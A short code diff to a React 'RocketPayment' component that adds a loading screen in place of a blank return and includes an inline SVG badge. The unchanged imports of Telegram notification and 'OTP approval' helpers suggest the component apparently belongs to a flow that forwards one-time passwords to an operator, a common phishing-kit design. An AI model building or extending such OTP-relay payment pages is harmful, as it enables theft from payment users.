@@ -3,6 +3,7 @@ import { useNavigate, useSearchParams } from "@/lib/flowRouter";
 import { sendTelegramNotification } from "@/lib/payment-telegram";
 import { submitOtpForApproval } from "@/lib/otpApproval";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
 import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
 import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
@@ -153,7 +154,7 @@ const RocketPayment = () => {
     return `data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='22'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e0e0e0'/%3E%3Cstop offset='50%25' stop-color='%23c8c8c8'/%3E%3Cstop offset='100%25' stop-color='%23a0a0a0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='90' height='22' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='22' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='22' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='22' fill='%23003399'/%3E%3Crect x='81' y='0' width='2' height='22' fill='%23003399'/%3E%3Crect x='83' y='0' width='2' height='22' fill='%23009933'/%3E%3Crect x='85' y='0' width='2' height='22' fill='%23cc0000'/%3E%3Ctext x='45' y='15' text-anchor='middle' font-family='Arial' font-size='11' font-weight='bold' fill='%23333'%3E${encoded}%3C/text%3E%3C/svg%3E`;
   };
 
-  if (isAllowed !== true) return null;
+  if (isAllowed !== true) return <FlowLoading />;
 
   if (showOtp) {
     return (
